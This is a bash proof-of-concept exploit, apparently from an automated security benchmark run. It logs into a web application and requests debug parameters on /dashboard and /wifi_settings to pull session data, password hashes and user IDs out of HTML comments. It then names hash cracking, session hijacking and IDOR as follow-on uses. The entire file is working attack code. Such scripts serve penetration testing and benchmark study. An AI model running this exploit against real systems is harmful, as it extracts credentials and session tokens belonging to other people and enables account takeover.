#!/bin/bash
# POC: POC demonstrating sensitive session data exposure through debug=true parameter in HTML comments. Shows how attackers can extract session credentials, user IDs, and authentication tokens from protected endpoints.
# Target: ./repo
# Created: 2025-11-07T22:26:55.122Z
# Session: benchmark-XBEN-088-24-mhpe87h9

# Debug Information Exposure POC - Version 2
# Demonstrates how sensitive session data is leaked in HTML comments when debug=true parameter is used

TARGET="${1:-http://localhost}"
USERNAME="${2:-test}"
PASSWORD="${3:-test}"

echo "[*] Debug Information Exposure POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Get a valid session by logging in
echo "[+] Step 1: Authenticating with credentials ($USERNAME:$PASSWORD)"

# Use curl with verbose output to capture all response headers including Set-Cookie
LOGIN_RESPONSE=$(curl -s -i -c /tmp/cookies.txt -d "username=$USERNAME&password=$PASSWORD" "$TARGET/login" 2>&1)

# Check if we got a successful login (look for Set-Cookie header)
if echo "$LOGIN_RESPONSE" | grep -qi "Set-Cookie.*session="; then
    echo "[+] Successfully obtained session cookie"
    SESSION_COOKIE=$(grep "session=" /tmp/cookies.txt | awk '{print $NF}')
    echo "[+] Session: $SESSION_COOKIE"
elif [ -f /tmp/cookies.txt ] && [ -s /tmp/cookies.txt ]; then
    echo "[+] Cookies file created"
    SESSION_COOKIE=$(grep "session=" /tmp/cookies.txt | awk '{print $NF}')
    if [ ! -z "$SESSION_COOKIE" ]; then
        echo "[+] Session: $SESSION_COOKIE"
    else
        echo "[-] No session cookie found in response"
        echo "[*] Continuing anyway to test debug mode..."
    fi
else
    echo "[*] No session cookie in response, testing debug mode without authentication..."
fi

echo ""
echo "[+] Step 2: Accessing /dashboard endpoint with debug=true parameter"
echo "[*] Request: GET $TARGET/dashboard?debug=true"

# Make request to /dashboard with debug=true and capture response
RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET/dashboard?debug=true")

# Extract the HTML comment containing session data
if echo "$RESPONSE" | grep -q "Server-Side Session Content"; then
    echo "[+] SUCCESS! Session data found in HTML comments!"
    echo ""
    echo "[+] Extracted sensitive information:"
    echo "================================================"
    # Extract and display the session comment
    echo "$RESPONSE" | sed -n '/Server-Side Session Content/,/-->/p'
    echo "================================================"
    echo ""
    
    # Check for specific sensitive data patterns
    FOUND_CRITICAL=0
    
    if echo "$RESPONSE" | grep -q "password_hash"; then
        echo "[!] CRITICAL: Password hash exposed!"
        FOUND_CRITICAL=$((FOUND_CRITICAL + 1))
    fi
    
    if echo "$RESPONSE" | grep -q "session_id"; then
        echo "[!] CRITICAL: Session ID exposed!"
        FOUND_CRITICAL=$((FOUND_CRITICAL + 1))
    fi
    
    if echo "$RESPONSE" | grep -q "user_id"; then
        echo "[!] CRITICAL: User ID exposed!"
        FOUND_CRITICAL=$((FOUND_CRITICAL + 1))
    fi
    
    if echo "$RESPONSE" | grep -q "_permanent"; then
        echo "[!] CRITICAL: Session permanence flag exposed!"
        FOUND_CRITICAL=$((FOUND_CRITICAL + 1))
    fi
    
    if echo "$RESPONSE" | grep -q "username"; then
        echo "[!] CRITICAL: Username exposed!"
        FOUND_CRITICAL=$((FOUND_CRITICAL + 1))
    fi
    
    echo ""
    echo "[+] Impact: Found $FOUND_CRITICAL types of sensitive data in HTML comments"
    echo "[+] This information can be used for:"
    echo "    - Cracking password hashes"
    echo "    - Session hijacking/fixation attacks"
    echo "    - IDOR attacks using exposed user_id"
    echo "    - Privilege escalation"
    
    VULN_FOUND=1
else
    echo "[-] Session data not found in HTML comments at /dashboard"
    VULN_FOUND=0
fi

echo ""
echo "[+] Step 3: Testing /wifi_settings endpoint with debug=session parameter"
echo "[*] Request: GET $TARGET/wifi_settings?debug=session"

WIFI_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET/wifi_settings?debug=session")

if echo "$WIFI_RESPONSE" | grep -q "Server-Side Session Content"; then
    echo "[+] SUCCESS! Session data also exposed at /wifi_settings endpoint!"
    echo "================================================"
    echo "$WIFI_RESPONSE" | sed -n '/Server-Side Session Content/,/-->/p'
    echo "================================================"
    VULN_FOUND=1
else
    echo "[-] Session data not found at /wifi_settings endpoint"
fi

echo ""
if [ $VULN_FOUND -eq 1 ]; then
    echo "[+] POC SUCCESSFUL: Debug mode information disclosure vulnerability confirmed!"
    echo "[*] Sensitive session data is exposed in HTML comments on protected endpoints"
    rm -f /tmp/cookies.txt
    exit 0
else
    echo "[-] POC FAILED: Could not confirm vulnerability"
    rm -f /tmp/cookies.txt
    exit 1
fi